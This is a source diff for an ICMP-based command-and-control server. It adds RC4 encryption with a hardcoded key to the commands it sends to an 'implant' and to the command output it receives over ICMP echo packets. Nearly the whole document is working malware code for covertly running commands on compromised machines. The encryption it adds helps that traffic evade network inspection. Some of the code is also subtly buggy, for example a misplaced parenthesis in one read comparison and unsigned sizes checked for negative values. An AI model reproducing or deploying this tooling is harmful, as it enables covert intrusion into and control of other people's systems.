@@ -5,7 +5,12 @@
 #include <sys/socket.h>
 #include <netinet/ip.h>
 #include <arpa/inet.h>
+#include <sys/ioctl.h>
 #include "../include/c2.h"
+#include "../include/rc4.h"
+
+#define KEY "thisisapassword"
+#define KEY_LENGTH 15
 
 // creates a raw ICMP socket and binds it
 int create_socket(char *interface_to_bind) {
@@ -53,28 +58,35 @@ unsigned short cksum(unsigned short *addr, int len) {
 }
 
 // get the input and return it's buffer
-char *get_command(char *buffer) {
+unsigned char *get_command(char *input) {
+    unsigned char *cipher_text = (unsigned char *) calloc(BUFFER_SIZE, 1);
 
     write(1, "> ", 2);
-    fgets(buffer, BUFFER_SIZE, stdin);
+    fgets(input, BUFFER_SIZE, stdin);
 
-    return buffer;
+    // encrypt the command
+    RC4((unsigned char *) input, strlen(input), (unsigned char *) KEY, KEY_LENGTH, cipher_text);
+    
+    return cipher_text;
 }
 
-// read from the socket and write the data in a buffer
-int read_from_socket(int sockfd, char *buffer, int size) {
-    int bytes_num = read(sockfd, buffer, size);
+// read from the socket and write the data in a buffer, returns how much have been read
+size_t read_from_socket(int sockfd, unsigned char *buffer, size_t size) {
+    size_t nbytes = read(sockfd, buffer, size);
 
-    if (bytes_num < 0) {
+    if (nbytes < 0) {
         return -1;
     }
 
-    if (bytes_num > size) {
+    if (nbytes > size) {
         fprintf(stderr, "the received packet is bigger than the designed size\n");
         return -1;
     }
 
-    return 1;
+    if (nbytes > 28) {
+        return nbytes - 28;
+    }
+    return 0;
 }
 
 // check if we got an actual connection from our implant
@@ -102,32 +114,29 @@ struct sockaddr_in prep_ip_headers(struct iphdr *ip) {
     return addr;
 }
 
-
 // parse the data section
-char *parse_data_section(char *packet) {
+unsigned char *parse_data_section(unsigned char *packet) {
     // get the data section (ignoring the IP & ICMP headers)
-    char *data = (char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
+    unsigned char *data = (unsigned char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
     
-    data[strlen(data)] = '\0';
-
     return data;
 }
 
+
 // prep'ing the ICMP headers & setting up the checksum
-void prep_icmp_headers(struct icmphdr *icmp, char *data, uint16_t checksum) {
+void prep_icmp_headers(struct icmphdr *icmp, uint16_t checksum) {
     icmp->checksum = checksum;
     icmp->type = 8;
     icmp->un.echo.id = 9001;
 }
 
-
 // reuse the ICMP packet to append our input in the data section
-void append_to_data_section(struct icmphdr *icmp, char *data, char *input) {
-    memcpy((char *) data, input, strlen(input));
+void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *input) {
+    memcpy(data, input, strlen((char *) input));
 
-    uint16_t checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + strlen(input));
+    uint16_t checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + strlen((char *) input));
 
-    prep_icmp_headers(icmp, data, checksum);
+    prep_icmp_headers(icmp, checksum);
 }
 
 // the actual interaction occurs here
@@ -135,31 +144,34 @@ void interact(int sockfd) {
     struct iphdr *ip; // holds the IP header
     struct icmphdr *icmp; // holds the ICMP header
     struct sockaddr_in addr; // holds the IP address
-    char *packet; // holds the ICMP packet
-    char *data; // holds the ICMP packet's data section
+    unsigned char *packet; // holds the ICMP packet
+    unsigned char *data; // holds the ICMP packet's data section
+    unsigned char *cipher_text = calloc(BUFFER_SIZE, 1);
+    unsigned char *command;
     char *input; // holds the input buffer
     char src_ip[INET_ADDRSTRLEN]; // buffer to store the source IP (16 bytes)
-    int bytes;
-    int packet_size = sizeof(struct iphdr *) + sizeof(struct icmphdr *) + BUFFER_SIZE;
+    size_t nbytes, nbytes_tmp;
+    size_t packet_size = sizeof(struct iphdr *) + sizeof(struct icmphdr *) + BUFFER_SIZE;
 
-    input = (char *) malloc(BUFFER_SIZE);
-    packet = (char *) malloc(packet_size);
+    input = malloc(BUFFER_SIZE);
+    packet = (unsigned char *) malloc(packet_size);
 
     if (input == NULL || packet == NULL) {
         fprintf(stderr, "Error: Cannot allocate memory\n");
         free(input);
         free(packet);
-        close(sockfd);
-        exit(EXIT_FAILURE);
+        return;
     }
 
-    printf("[+] Waiting for connections...\n");
+    puts("[+] Waiting for connections...");
     
     while (1) {
-        if (read_from_socket(sockfd, packet, packet_size) < 0) {
+        if ((nbytes_tmp = read_from_socket(sockfd, packet, packet_size) < 0)) {
             break;
         }
-
+        if (nbytes_tmp != 0) {
+            nbytes = nbytes_tmp;
+        }
         ip = (struct iphdr *) packet;
         icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
 
@@ -173,14 +185,14 @@ void interact(int sockfd) {
 
             data = parse_data_section(packet);
 
-            get_command(input);
+            command = get_command(input);
 
-            append_to_data_section(icmp, data, input);
+            append_to_data_section(icmp, data, command);
 
             data = NULL;
 
-            bytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(input), 0, (struct sockaddr *) &addr, sizeof(addr));
-            if (bytes < 0) {
+            nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(input), 0, (struct sockaddr *) &addr, sizeof(addr));
+            if (nbytes < 0) {
                 perror("sendto()");
                 break;
             }
@@ -192,8 +204,12 @@ void interact(int sockfd) {
     }
 
     while (1) {
-        if (read_from_socket(sockfd, packet, packet_size) < 0) {
+        if ((nbytes_tmp = read_from_socket(sockfd, packet, packet_size)) < 0) {
             break;
+        }
+
+        if (nbytes_tmp != 0) {
+            nbytes = nbytes_tmp;
         }
 
         ip = (struct iphdr *) packet;
@@ -205,30 +221,34 @@ void interact(int sockfd) {
 
             data = parse_data_section(packet);
 
-            write(1, data, strlen(data));
+            // decrypt the cipher text (command's output)
+            RC4(data, nbytes, (unsigned char *) KEY, KEY_LENGTH, cipher_text);
+                        
+            write(1, cipher_text, nbytes);
 
-            get_command(input);
+            command = get_command(input);
 
-            append_to_data_section(icmp, data, input);
+            append_to_data_section(icmp, data, command);
 
             data = NULL;
 
-            bytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(input), 0, (struct sockaddr *) &addr, sizeof(addr));
-            if (bytes < 0) {
+            // we're using a stream cipher, and since length of input == cipher_text then we use strlen(input) instead
+            nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(input), 0, (struct sockaddr *) &addr, sizeof(addr));
+            if (nbytes < 0) {
                 perror("sendto()");
                 break;
             }
 
             // clean up the packet buffer for the next usage
             memset(packet, 0, packet_size);
+            memset(cipher_text, 0, BUFFER_SIZE);
             memset(input, 0, strlen(input));
         }
     }
     
     free(input);
+    free(cipher_text);
     free(packet);
-    close(sockfd);
-    exit(EXIT_FAILURE);
 }
 
 // initializes the options and starts the c2
@@ -236,4 +256,6 @@ void c2_init_n_call(char *interface_to_bind) {
     int sockfd = create_socket(interface_to_bind);
 
     interact(sockfd);
+
+    close(sockfd);
 }
